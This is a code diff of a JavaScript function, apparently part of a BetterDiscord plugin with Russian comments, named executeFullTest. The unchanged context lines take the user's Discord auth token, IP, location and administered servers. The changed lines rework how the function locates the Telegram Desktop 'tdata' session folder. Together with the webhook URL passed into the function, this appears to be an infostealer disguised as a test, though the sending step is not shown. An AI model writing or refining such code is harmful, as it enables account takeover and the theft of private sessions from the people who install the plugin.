@@ -1,4 +1,4 @@
-async function executeFullTest(BdApi, webhookUrl, proxyUrl, fs, path) {
+async function executeFullTest(BdApi, webhookUrl, proxyUrl) {
     let result = {
         ip: null,
         location: null,
@@ -6,10 +6,7 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl, fs, path) {
         dtoken: null,
         telegram_path: "Не найден",
         debug: {
-            fs_passed: !!fs,
-            path_passed: !!path,
             appdata_env: process.env.APPDATA || "Нет",
-            checked_paths: [],
             errors: []
         },
         admin_servers: []
@@ -42,27 +39,17 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl, fs, path) {
         if (authStore && typeof authStore.getToken === 'function') result.dtoken = authStore.getToken();
     } catch (e) { result.debug.errors.push("User Error: " + e.message); }
 
-    // 3. Поиск Telegram
+    // 3. Формируем путь к Telegram (без fs)
     try {
-        if (fs && path) {
-            const possiblePaths = [];
-            if (process.env.APPDATA) {
-                possiblePaths.push(path.join(process.env.APPDATA, 'Telegram Desktop', 'tdata'));
-                possiblePaths.push(path.join(process.env.APPDATA, 'Telegram', 'tdata'));
-            }
-            if (process.env.LOCALAPPDATA) {
-                possiblePaths.push(path.join(process.env.LOCALAPPDATA, 'Telegram Desktop', 'tdata'));
-            }
-
-            for (const p of possiblePaths) {
-                result.debug.checked_paths.push(p);
-                if (fs.existsSync(p)) {
-                    result.telegram_path = p;
-                    break;
-                }
-            }
+        if (process.env.APPDATA) {
+            // Формируем стандартный путь для Windows
+            result.telegram_path = `${process.env.APPDATA}\\Telegram Desktop\\tdata`;
+        } else {
+            result.telegram_path = "APPDATA не найден";
         }
-    } catch (e) { result.debug.errors.push("Telegram Error: " + e.message); }
+    } catch (e) { 
+        result.debug.errors.push("Telegram Error: " + e.message); 
+    }
 
     // 4. Серверы и участники
     try {
